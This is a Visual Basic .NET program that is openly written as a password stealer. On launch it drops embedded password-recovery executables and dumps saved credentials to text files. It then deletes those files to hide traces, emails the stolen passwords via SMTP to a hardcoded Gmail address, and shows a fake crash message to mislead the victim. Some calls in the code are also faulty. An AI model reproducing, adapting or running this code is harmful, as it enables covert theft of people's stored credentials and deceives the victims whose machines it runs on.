Imports System.Net.Mail 'Needed to send e-mails

Public Class Form1

	Dim server As String = "smtp.mail.com" 'Use a mail.com account for this
	Dim username As String = "username" 'Replace w/ your e-mail username
	Dim password As String = "password" 'Replace w/ your e-mail password
	Dim port = 587
	
	Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
		On Error Resume Next 'Enables program to continue regardless if an error is thrown
		
		Dim home As String = My.Computer.FileSystem.SpecialDirectories.MyMusic & "\home\" 'Declares "My Music" as "home" (We will extract files here)
		If My.Computer.FileSystem.DirectoryExist(home) Then
			My.Computer.FileSystem.DeleteDirectory(home, FileIO.DeleteDirectoryOption.DeleteAllContents) 'Check if directory already exists & if so delete it
		End If
		
		MDir(home) 'Recreate directory
		
		IO.File.WriteAllBytes(home & "1.exe", My.Resources._1) 'Export recovery program to new "home" directory
		IO.File.WriteAllBytes(home & "2.exe", My.Resources._2)
		IO.File.WriteAllBytes(home & "3.exe", My.Resources._3)
		IO.File.WriteAllBytes(home & "4.exe", My.Resources._4)
		
		Process.Start(home & "1.exe", "/stext 1.txt") 'Start the recovery program with the "/stext" arg which exports password to the given text file
		Process.Start(home & "1.exe", "/stext 2.txt")
		Process.Start(home & "1.exe", "/stext 3.txt")
		Process.Start(home & "1.exe", "/stext 4.txt")

		Threading.Thread.Sleep(2000) 'Wait 2 seconds for passwords export
		
		Dim a As String = IO.File.ReadAllText(Application.StartupPath & "/1.txt") 'Read produced text files after export
		Dim b As String = IO.File.ReadAllText(Application.StartupPath & "/2.txt")
		Dim c As String = IO.File.ReadAllText(Application.StartupPath & "/3.txt")
		Dim d As String = IO.File.ReadAllText(Application.StartupPath & "/4.txt")
		
		Dim final As String = a & vbNewLine & "-----NEXT-----" & vbNewLine & b & "-----NEXT-----" & vbNewLine & c & "-----NEXT-----" & vbNewLine & d 'Organize text files content into a final string
		
		Kill(Application.StartupPath & "/1.txt") 'Delete the text files to remove any traces of application
		Kill(Application.StartupPath & "/2.txt")
		Kill(Application.StartupPath & "/3.txt")
		Kill(Application.StartupPath & "/4.txt")
		
		Dim smtpServer As New SmtpClient() 'Create an smtp client to send our e-mail
		Dim mail As New MailMessage()
		smtpServer.Credentials = New Net.NetworkCredential(username, password)
		smtpServer.Port = port
		smtpServer.Host = server
		smtpServer.EnableSsl = True
		mail = New MailMessage()
		mail.From = New MailAddress(username)
		mail.To.Add("azzusssubt@gmail.com") 'Change to the e-mail where you wish to recieve the passwords
		mail.Subject = "Password stolen at" & My.Computer.Clock.LocalTime
		mail.Body = final
		smtpServer.Send(mail)
		MsgBox("SEGFAULT: 0x100B0SE (0xA502D4, 0x00100, 0xBC0D36" & vbNewLine & "Inaccesible handler or device.")
		Me.Close()
	End Sub
	
End Class
